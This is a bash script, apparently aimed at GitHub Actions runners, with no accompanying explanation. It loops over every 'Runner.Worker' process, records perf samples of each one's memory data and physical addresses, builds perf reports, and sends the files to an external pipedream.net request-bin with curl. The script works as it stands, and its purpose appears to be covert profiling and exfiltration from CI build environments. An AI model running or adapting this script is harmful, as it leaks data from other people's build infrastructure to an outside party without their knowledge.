#!/bin/bash

for pid in $(ps -ef | grep Runner.Worker  | tr -s ' ' | cut -d ' ' -f2)
do
    echo "-----$pid-----" > /tmp/file.txt;
    perf record -p $pid -o "/tmp/$pid.perf" -d --phys-data >> /tmp/file.txt;
    echo "finished running perf" >> /tmp/file.txt;
    echo $(ls -l /tmp | grep .perf) >> /tmp/file.txt;
    curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net

    echo "running report for $pid" > /tmp/file.txt;
    perf report -i "/tmp/$pid.perf" >> /tmp/file.txt;
    curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
done
